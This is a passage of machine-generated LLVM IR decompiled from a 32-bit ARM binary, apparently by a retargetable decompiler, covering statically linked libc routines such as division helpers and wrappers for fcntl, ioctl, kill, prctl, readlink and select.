bb95:                                             ; preds = %dec_label_pc_1116c
  %v2_11170 = and i32 %v1_110cc, 32768
  %v3_11170 = icmp eq i32 %v2_11170, 0
  %v4_11170 = udiv i32 %v1_110cc, 65536
  br i1 %v3_11170, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_1116c
  %v0_1117c65 = phi i32 [ %v1_110cc, %dec_label_pc_1116c ], [ %v4_11170, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_11180 = phi i32 [ %v0_1117c65, %.thread16 ], [ %v4_11170, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_1117c = icmp ugt i32 %v1_11180, 255
  br i1 %v2_1117c, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_11180 = and i32 %v1_11180, 128
  %v3_11180 = icmp eq i32 %v2_11180, 0
  %v4_11180 = udiv i32 %v1_11180, 256
  br i1 %v3_11180, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_11184 = or i32 %storemerge, 8
  store i32 %v2_11184, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_11190 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_11184, %bb98 ]
  %v1_1118c = phi i32 [ %v1_11180, %bb96 ], [ %v4_11180, %bb97 ], [ %v4_11180, %bb98 ]
  %v2_11188 = icmp ugt i32 %v1_1118c, 15
  br i1 %v2_11188, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_1118c = and i32 %v1_1118c, 8
  %v3_1118c = icmp eq i32 %v2_1118c, 0
  %v4_1118c = udiv i32 %v1_1118c, 16
  br i1 %v3_1118c, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_11190 = add nsw i32 %v1_11190, 4
  store i32 %v2_11190, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_11198 = phi i32 [ %v1_11190, %.thread17 ], [ %v1_11190, %bb99 ], [ %v2_11190, %bb100 ]
  %v5_1119c = phi i32 [ %v1_1118c, %.thread17 ], [ %v4_1118c, %bb99 ], [ %v4_1118c, %bb100 ]
  %v2_11194 = icmp ugt i32 %v5_1119c, 3
  %v7_11194 = icmp eq i32 %v5_1119c, 4
  %v2_11198 = xor i1 %v7_11194, true
  %v3_11198 = and i1 %v2_11194, %v2_11198
  br i1 %v3_11198, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_11198 = add nsw i32 %v4_11198, 3
  store i32 %v5_11198, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_1119c = phi i32 [ %v4_11198, %.thread18 ], [ %v5_11198, %bb101 ]
  %v2_1119c = xor i1 %v2_11194, true
  %v3_1119c = or i1 %v7_11194, %v2_1119c
  br i1 %v3_1119c, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_1119c = udiv i32 %v5_1119c, 2
  %v9_1119c = add i32 %v4_1119c, %v8_1119c
  store i32 %v9_1119c, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_111a0 = phi i32 [ %v4_1119c, %bb102 ], [ %v9_1119c, %bb103 ]
  %v6_111a0 = lshr i32 %v0_110cc, %v1_111a0
  store i32 %v6_111a0, i32* %r0.global-to-local, align 4
  ret i32 %v6_111a0

dec_label_pc_111a8:                               ; preds = %entry
  %v0_111ac = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1119c, { 1, 0 }
  uselistorder i1 %v7_11194, { 1, 0 }
  uselistorder i32 %v4_1118c, { 1, 0 }
  uselistorder i32 %v1_1118c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_11184, { 1, 0 }
  uselistorder i32 %v4_11180, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11180, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11170, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_11148, { 1, 0 }
  uselistorder i32 %v0_11158, { 1, 0, 2 }
  uselistorder i32 %v4_1113c, { 1, 0 }
  uselistorder i32 %v1_11144, { 1, 2, 0 }
  uselistorder i32 %v4_11130, { 1, 0 }
  uselistorder i32 %v1_11138, { 1, 2, 0 }
  uselistorder i32 %v4_11124, { 1, 0 }
  uselistorder i32 %v1_1112c, { 1, 2, 0 }
  uselistorder i32 %v1_11150, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_11120, { 1, 0 }
  uselistorder i32 %v1_1114c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1110c, { 1, 0 }
  uselistorder i32 %v3_11108, { 1, 0 }
  uselistorder i32 %v1_11108, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1110c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_110f8, { 1, 0 }
  uselistorder i32 %v4_110f4, { 2, 1, 0 }
  uselistorder i32 %v1_110f8, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_11100.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_110cc, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_110cc, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_110c0, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 65535, { 104, 0, 1, 9, 10, 2, 3, 23, 22, 26, 52, 25, 53, 11, 12, 4, 27, 54, 28, 55, 56, 13, 57, 24, 29, 58, 30, 59, 31, 60, 61, 62, 32, 63, 64, 14, 65, 5, 36, 66, 35, 67, 33, 68, 34, 69, 70, 15, 71, 6, 72, 73, 40, 74, 39, 75, 37, 76, 38, 77, 17, 16, 78, 79, 41, 80, 42, 81, 19, 18, 82, 83, 43, 84, 44, 85, 86, 87, 45, 88, 89, 90, 91, 20, 92, 93, 7, 46, 94, 47, 95, 48, 96, 97, 98, 21, 99, 100, 8, 51, 101, 49, 102, 50, 103 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_11158, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_11114, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11100thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_111c0 = udiv i32 %arg1, %arg2
  ret i32 %v2_111c0
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_111dc = call i32 @__GI_raise(i32 8)
  ret i32 %v1_111dc
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_111f8 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_111f8, 2
  br i1 %tmp, label %dec_label_pc_11234, label %dec_label_pc_11210

dec_label_pc_11210:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_11268, label %dec_label_pc_11224

dec_label_pc_11224:                               ; preds = %dec_label_pc_11210
  %v0_11228 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_1125c

dec_label_pc_11234:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_11250, label %dec_label_pc_11268

dec_label_pc_11250:                               ; preds = %dec_label_pc_11234
  %v0_11254 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_1125c

dec_label_pc_1125c:                               ; preds = %dec_label_pc_11224, %dec_label_pc_11250
  %storemerge2 = phi i32 [ %v0_11228, %dec_label_pc_11224 ], [ %v0_11254, %dec_label_pc_11250 ]
  %storemerge.in = load i16, i16* @global_var_2225c.361, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_1125c = load i32, i32* %r2.global-to-local, align 4
  %v1_1125c = sub i32 0, %v0_1125c
  store i32 %v1_1125c, i32* %r2.global-to-local, align 4
  %v3_11260 = add i32 %storemerge, %storemerge2
  %v4_11260 = inttoptr i32 %v3_11260 to i32*
  store i32 %v1_1125c, i32* %v4_11260, align 4
  br label %dec_label_pc_11268

dec_label_pc_11268:                               ; preds = %dec_label_pc_11210, %dec_label_pc_11234, %dec_label_pc_1125c
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1125c ], [ %arg1, %dec_label_pc_11234 ], [ %arg1, %dec_label_pc_11210 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_11268, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1125c, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_11280 = load i32, i32* @r2, align 4
  %v9_11280 = load i32, i32* @r3, align 4
  store i32 %v9_11280, i32* %stack_var_-4, align 4
  %v3_11284 = load i32, i32* @r4, align 4
  store i32 %v3_11284, i32* %stack_var_-32, align 4
  %v6_11284 = load i32, i32* @r5, align 4
  %v12_11284 = load i32, i32* @r7, align 4
  %v4_11294 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 12824) to i32*), align 4
  %v2_1129c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1129c, i32* @r3, align 4
  %v2_112a0 = icmp eq i32 %v4_11294, 0
  %v0_112a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_112a8, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_11280, i32* @r4, align 4
  br i1 %v2_112a0, label %dec_label_pc_112c4, label %dec_label_pc_112b8

dec_label_pc_112b8:                               ; preds = %entry
  %v7_112b8 = icmp eq i32 %arg2, 7
  br i1 %v7_112b8, label %dec_label_pc_11304, label %bb

bb:                                               ; preds = %dec_label_pc_112b8
  %v8_112bc = icmp eq i32 %arg2, 14
  br i1 %v8_112bc, label %dec_label_pc_11304, label %dec_label_pc_112c4

dec_label_pc_112c4:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_112a8, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_112a8, -4095
  br i1 %tmp, label %dec_label_pc_112fc, label %dec_label_pc_112e4

dec_label_pc_112e4:                               ; preds = %dec_label_pc_112c4
  %v0_112e8 = call i32 @__aeabi_read_tp()
  %v3_112ec = load i16, i16* @global_var_2225c.361, align 2
  %v4_112ec = sext i16 %v3_112ec to i32
  store i32 %v4_112ec, i32* @r3, align 4
  %v0_112f0 = load i32, i32* @r2, align 4
  %v1_112f0 = sub i32 0, %v0_112f0
  store i32 %v1_112f0, i32* @r2, align 4
  %v3_112f4 = add i32 %v4_112ec, %v0_112e8
  %v4_112f4 = inttoptr i32 %v3_112f4 to i32*
  store i32 %v1_112f0, i32* %v4_112f4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_112fc

dec_label_pc_112fc:                               ; preds = %dec_label_pc_112c4, %dec_label_pc_112e4
  %v0_112fc = phi i32 [ %v0_112a8, %dec_label_pc_112c4 ], [ -1, %dec_label_pc_112e4 ]
  br label %dec_label_pc_11350

dec_label_pc_11304:                               ; preds = %dec_label_pc_112b8, %bb
  %v0_11304 = call i32 @__libc_enable_asynccancel()
  %v0_11308 = load i32, i32* @r7, align 4
  store i32 %v0_11308, i32* @r1, align 4
  store i32 %v0_11304, i32* %r6.global-to-local, align 4
  %v0_11314 = load i32, i32* @r5, align 4
  store i32 %v0_11314, i32* %r0.global-to-local, align 4
  store i32 %v0_11314, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_11314, -4095
  br i1 %tmp15, label %dec_label_pc_11344, label %dec_label_pc_1132c

dec_label_pc_1132c:                               ; preds = %dec_label_pc_11304
  %v1_11330 = sub i32 0, %v0_11314
  %v0_11334 = call i32 @__aeabi_read_tp()
  store i32 %v0_11334, i32* %r0.global-to-local, align 4
  %v3_11338 = load i16, i16* @global_var_2225c.361, align 2
  %v4_11338 = sext i16 %v3_11338 to i32
  store i32 %v4_11338, i32* @r3, align 4
  %v3_1133c = add i32 %v4_11338, %v0_11334
  %v4_1133c = inttoptr i32 %v3_1133c to i32*
  store i32 %v1_11330, i32* %v4_1133c, align 4
  store i32 -1, i32* @r2, align 4
  %v0_11344.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11344

dec_label_pc_11344:                               ; preds = %dec_label_pc_11304, %dec_label_pc_1132c
  %v0_11348 = phi i32 [ %v0_11314, %dec_label_pc_11304 ], [ -1, %dec_label_pc_1132c ]
  %v0_11344 = phi i32 [ %v0_11304, %dec_label_pc_11304 ], [ %v0_11344.pre, %dec_label_pc_1132c ]
  store i32 %v0_11344, i32* %r0.global-to-local, align 4
  store i32 %v0_11348, i32* @r7, align 4
  %v1_1134c = call i32 @__libc_disable_asynccancel(i32 %v0_11344)
  store i32 %v1_1134c, i32* %r0.global-to-local, align 4
  %v0_11350.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11350

dec_label_pc_11350:                               ; preds = %dec_label_pc_112fc, %dec_label_pc_11344
  %v0_11350 = phi i32 [ %v0_112fc, %dec_label_pc_112fc ], [ %v0_11350.pre, %dec_label_pc_11344 ]
  store i32 %v0_11350, i32* %r0.global-to-local, align 4
  %v2_11358 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11358, i32* @r4, align 4
  store i32 %v6_11284, i32* @r5, align 4
  store i32 %v12_11284, i32* @r7, align 4
  ret i32 %v0_11350

; uselistorder directives
  uselistorder i32 %v0_11350, { 1, 0 }
  uselistorder i32 %v0_11344, { 1, 0 }
  uselistorder i32 %v0_11314, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_112a8, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_11350, { 1, 0 }
  uselistorder label %dec_label_pc_11344, { 1, 0 }
  uselistorder label %dec_label_pc_11304, { 1, 0 }
  uselistorder label %dec_label_pc_112fc, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_11384 = load i32, i32* @r0, align 4
  ret i32 %v1_11384
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_11388 = load i32, i32* @r3, align 4
  store i32 %v9_11388, i32* %stack_var_-4, align 4
  %v3_1138c = load i32, i32* @r4, align 4
  store i32 %v3_1138c, i32* %stack_var_-32, align 4
  %v6_1138c = load i32, i32* @r5, align 4
  %v12_1138c = load i32, i32* @r7, align 4
  %v4_1139c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 12824) to i32*), align 4
  %v2_113a4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_113a4, i32* @r3, align 4
  %v2_113a8 = icmp eq i32 %v4_1139c, 0
  %v0_113b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_113b0, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_113a8, label %dec_label_pc_113c0, label %dec_label_pc_113f8

dec_label_pc_113c0:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_113b0, -4095
  br i1 %tmp, label %dec_label_pc_113f0, label %dec_label_pc_113d8

dec_label_pc_113d8:                               ; preds = %dec_label_pc_113c0
  %v1_113dc = sub i32 0, %v0_113b0
  %v3_113e0 = load i16, i16* @global_var_2225c.361, align 2
  %v4_113e0 = sext i16 %v3_113e0 to i32
  store i32 %v4_113e0, i32* @r3, align 4
  %v0_113e4 = call i32 @__aeabi_read_tp()
  %v2_113e8 = load i32, i32* @r3, align 4
  %v3_113e8 = add i32 %v2_113e8, %v0_113e4
  %v4_113e8 = inttoptr i32 %v3_113e8 to i32*
  store i32 %v1_113dc, i32* %v4_113e8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_113f0

dec_label_pc_113f0:                               ; preds = %dec_label_pc_113c0, %dec_label_pc_113d8
  %v0_113f0 = phi i32 [ %v0_113b0, %dec_label_pc_113c0 ], [ -1, %dec_label_pc_113d8 ]
  br label %dec_label_pc_11444

dec_label_pc_113f8:                               ; preds = %entry
  %v0_113f8 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_113f8, i32* %r6.global-to-local, align 4
  %v0_11408 = load i32, i32* @r4, align 4
  store i32 %v0_11408, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_11408, -4095
  br i1 %tmp15, label %dec_label_pc_11438, label %dec_label_pc_11420

dec_label_pc_11420:                               ; preds = %dec_label_pc_113f8
  %v1_11424 = sub i32 0, %v0_11408
  %v3_11428 = load i16, i16* @global_var_2225c.361, align 2
  %v4_11428 = sext i16 %v3_11428 to i32
  store i32 %v4_11428, i32* @r3, align 4
  %v0_1142c = call i32 @__aeabi_read_tp()
  store i32 %v0_1142c, i32* %r0.global-to-local, align 4
  %v2_11430 = load i32, i32* @r3, align 4
  %v3_11430 = add i32 %v2_11430, %v0_1142c
  %v4_11430 = inttoptr i32 %v3_11430 to i32*
  store i32 %v1_11424, i32* %v4_11430, align 4
  %v0_11438.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11438

dec_label_pc_11438:                               ; preds = %dec_label_pc_113f8, %dec_label_pc_11420
  %v0_1143c = phi i32 [ %v0_11408, %dec_label_pc_113f8 ], [ -1, %dec_label_pc_11420 ]
  %v0_11438 = phi i32 [ %v0_113f8, %dec_label_pc_113f8 ], [ %v0_11438.pre, %dec_label_pc_11420 ]
  store i32 %v0_11438, i32* %r0.global-to-local, align 4
  store i32 %v0_1143c, i32* @r7, align 4
  %v1_11440 = call i32 @__libc_disable_asynccancel(i32 %v0_11438)
  store i32 %v1_11440, i32* %r0.global-to-local, align 4
  %v0_11444.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11444

dec_label_pc_11444:                               ; preds = %dec_label_pc_113f0, %dec_label_pc_11438
  %v0_11444 = phi i32 [ %v0_113f0, %dec_label_pc_113f0 ], [ %v0_11444.pre, %dec_label_pc_11438 ]
  store i32 %v0_11444, i32* %r0.global-to-local, align 4
  %v2_1144c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1144c, i32* @r4, align 4
  store i32 %v6_1138c, i32* @r5, align 4
  store i32 %v12_1138c, i32* @r7, align 4
  ret i32 %v0_11444

; uselistorder directives
  uselistorder i32 %v0_11444, { 1, 0 }
  uselistorder i32 %v0_11438, { 1, 0 }
  uselistorder i32 %v0_11408, { 1, 2, 0, 3 }
  uselistorder i32 %v0_113b0, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_11444, { 1, 0 }
  uselistorder label %dec_label_pc_11438, { 1, 0 }
  uselistorder label %dec_label_pc_113f0, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11468 = load i32, i32* @r7, align 4
  store i32 %v3_11468, i32* %stack_var_-8, align 4
  %v0_11474 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11474, -4095
  br i1 %tmp, label %dec_label_pc_11494, label %dec_label_pc_1147c

dec_label_pc_1147c:                               ; preds = %entry
  %v1_11480 = sub i32 0, %v0_11474
  %v3_11484 = load i16, i16* @global_var_2225c.361, align 2
  %v4_11484 = sext i16 %v3_11484 to i32
  %v0_11488 = call i32 @__aeabi_read_tp()
  %v3_1148c = add i32 %v4_11484, %v0_11488
  %v4_1148c = inttoptr i32 %v3_1148c to i32*
  store i32 %v1_11480, i32* %v4_1148c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11494.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11494

dec_label_pc_11494:                               ; preds = %entry, %dec_label_pc_1147c
  %v1_11498 = phi i32 [ %v0_11474, %entry ], [ -1, %dec_label_pc_1147c ]
  %v2_11494 = phi i32 [ %v3_11468, %entry ], [ %v2_11494.pre, %dec_label_pc_1147c ]
  store i32 %v2_11494, i32* @r7, align 4
  ret i32 %v1_11498

; uselistorder directives
  uselistorder i32 %v0_11474, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11494, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_114a0 = load i32, i32* @r4, align 4
  store i32 %v3_114a0, i32* %stack_var_-12, align 4
  %v0_114b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_114b0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_114b0, -4095
  br i1 %tmp, label %dec_label_pc_114d8, label %dec_label_pc_114c0

dec_label_pc_114c0:                               ; preds = %entry
  %v0_114c4 = call i32 @__aeabi_read_tp()
  %v3_114c8 = load i16, i16* @global_var_2225c.361, align 2
  %v4_114c8 = sext i16 %v3_114c8 to i32
  %v0_114cc = load i32, i32* %r2.global-to-local, align 4
  %v1_114cc = sub i32 0, %v0_114cc
  store i32 %v1_114cc, i32* %r2.global-to-local, align 4
  %v3_114d0 = add i32 %v4_114c8, %v0_114c4
  %v4_114d0 = inttoptr i32 %v3_114d0 to i32*
  store i32 %v1_114cc, i32* %v4_114d0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_114d8.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_114d8

dec_label_pc_114d8:                               ; preds = %entry, %dec_label_pc_114c0
  %v1_114dc = phi i32 [ %v0_114b0, %entry ], [ -1, %dec_label_pc_114c0 ]
  %v2_114d8 = phi i32 [ %v3_114a0, %entry ], [ %v2_114d8.pre, %dec_label_pc_114c0 ]
  store i32 %v2_114d8, i32* @r4, align 4
  ret i32 %v1_114dc

; uselistorder directives
  uselistorder i32 %v0_114b0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_114d8, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_114e4 = load i32, i32* @r7, align 4
  store i32 %v3_114e4, i32* %stack_var_-8, align 4
  %v0_114f0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_114f0, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_114f0, -4095
  br i1 %tmp, label %dec_label_pc_11518, label %dec_label_pc_11500

dec_label_pc_11500:                               ; preds = %entry
  %v0_11504 = call i32 @__aeabi_read_tp()
  %v3_11508 = load i16, i16* @global_var_2225c.361, align 2
  %v4_11508 = sext i16 %v3_11508 to i32
  store i32 %v4_11508, i32* @r3, align 4
  %v0_1150c = load i32, i32* @r2, align 4
  %v1_1150c = sub i32 0, %v0_1150c
  store i32 %v1_1150c, i32* @r2, align 4
  %v3_11510 = add i32 %v4_11508, %v0_11504
  %v4_11510 = inttoptr i32 %v3_11510 to i32*
  store i32 %v1_1150c, i32* %v4_11510, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11518.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11518

dec_label_pc_11518:                               ; preds = %entry, %dec_label_pc_11500
  %v1_1151c = phi i32 [ %v0_114f0, %entry ], [ -1, %dec_label_pc_11500 ]
  %v2_11518 = phi i32 [ %v3_114e4, %entry ], [ %v2_11518.pre, %dec_label_pc_11500 ]
  store i32 %v2_11518, i32* @r7, align 4
  ret i32 %v1_1151c

; uselistorder directives
  uselistorder i32 %v0_114f0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11518, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11524 = load i32, i32* @r4, align 4
  store i32 %v3_11524, i32* %stack_var_-12, align 4
  %v0_11534 = load i32, i32* @r0, align 4
  store i32 %v0_11534, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11534, -4095
  br i1 %tmp, label %dec_label_pc_1155c, label %dec_label_pc_11544

dec_label_pc_11544:                               ; preds = %entry
  %v0_11548 = call i32 @__aeabi_read_tp()
  %v3_1154c = load i16, i16* @global_var_2225c.361, align 2
  %v4_1154c = sext i16 %v3_1154c to i32
  %v0_11550 = load i32, i32* %r2.global-to-local, align 4
  %v1_11550 = sub i32 0, %v0_11550
  store i32 %v1_11550, i32* %r2.global-to-local, align 4
  %v3_11554 = add i32 %v4_1154c, %v0_11548
  %v4_11554 = inttoptr i32 %v3_11554 to i32*
  store i32 %v1_11550, i32* %v4_11554, align 4
  %v2_1155c.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1155c

dec_label_pc_1155c:                               ; preds = %entry, %dec_label_pc_11544
  %v1_11560 = phi i32 [ %v0_11534, %entry ], [ -1, %dec_label_pc_11544 ]
  %v2_1155c = phi i32 [ %v3_11524, %entry ], [ %v2_1155c.pre, %dec_label_pc_11544 ]
  store i32 %v2_1155c, i32* @r4, align 4
  ret i32 %v1_11560

; uselistorder directives
  uselistorder i32 %v0_11534, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1155c, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_11568 = load i32, i32* @r4, align 4
  store i32 %v3_11568, i32* %stack_var_-28, align 4
  %v6_11568 = load i32, i32* @r5, align 4
  %v9_11568 = load i32, i32* @r6, align 4
  %v12_11568 = load i32, i32* @r7, align 4
  %v15_11568 = load i32, i32* @r8, align 4
  %v18_11568 = load i32, i32* @sl, align 4
  %v21_11568 = load i32, i32* @lr, align 4
  %v4_11578 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 12824) to i32*), align 4
  %v2_11580 = icmp eq i32 %v4_11578, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_11580, label %dec_label_pc_1159c, label %entry.dec_label_pc_115a8_crit_edge

entry.dec_label_pc_115a8_crit_edge:               ; preds = %entry
  br label %dec_label_pc_115a8

dec_label_pc_1159c:                               ; preds = %entry
  store i32 %v3_11568, i32* @r4, align 4
  store i32 %v9_11568, i32* @r6, align 4
  store i32 %v12_11568, i32* @r7, align 4
  store i32 %v15_11568, i32* @r8, align 4
  store i32 %v18_11568, i32* %sl.global-to-local, align 4
  %v0_115a4 = call i32 @__syscall_select()
  br label %dec_label_pc_115a8

dec_label_pc_115a8:                               ; preds = %entry.dec_label_pc_115a8_crit_edge, %dec_label_pc_1159c
  %v0_115a8 = call i32 @__libc_enable_asynccancel()
  %v0_115ac = load i32, i32* @r6, align 4
  store i32 %v0_115ac, i32* @r1, align 4
  store i32 %v0_115a8, i32* @r5, align 4
  %v0_115bc = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_115bc, i32* @r0, align 4
